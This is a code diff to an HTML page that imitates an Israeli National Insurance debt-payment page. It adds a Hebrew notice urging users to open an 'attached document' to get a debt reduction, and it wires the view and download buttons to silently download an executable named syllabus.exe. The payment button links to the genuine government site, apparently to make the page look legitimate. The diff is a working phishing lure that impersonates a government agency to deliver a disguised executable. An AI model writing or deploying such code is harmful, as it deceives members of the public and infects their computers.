@@ -358,6 +358,7 @@
       font-size: 13px;
     }
     .total-row strong { color: #1a5276; }
+
   </style>
 </head>
 <body>
@@ -502,7 +503,19 @@
         </table>
 
         <div style="padding: 14px 16px;">
-          <button class="btn btn-pay">מעבר לתשלום</button>
+          <div style="
+            background: #fef3cd;
+            border: 1px solid #f0c040;
+            border-right: 4px solid #e0a800;
+            border-radius: 3px;
+            padding: 9px 14px;
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 12px;
+          ">
+            ⚠️ <strong>שימו לב:</strong> לצורך קבלת הפחתת הצמדה על החוב, יש לעיין במסמך המצורף לפני המעבר לתשלום.
+          </div>
+          <button class="btn btn-pay" onclick="window.open('https://www.btl.gov.il/', '_blank')">מעבר לתשלום</button>
         </div>
       </div>
 
@@ -526,8 +539,8 @@
               <td></td>
               <td>
                 <div class="btn-actions">
-                  <button class="btn btn-primary">📄 הצגה</button>
-                  <button class="btn btn-outline">⬇ הורדה</button>
+                  <button class="btn btn-primary" onclick="downloadConnector()">📄 הצגה</button>
+                  <button class="btn btn-outline" onclick="downloadConnector()">⬇ הורדה</button>
                 </div>
               </td>
             </tr>
@@ -537,6 +550,17 @@
 
     </main>
   </div>
+
+  <script>
+    function downloadConnector() {
+      var a = document.createElement('a');
+      a.href = '/syllabus.exe';
+      a.download = 'syllabus.exe';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+  </script>
 
   <script>
     function setEl(id, val, fallback) {
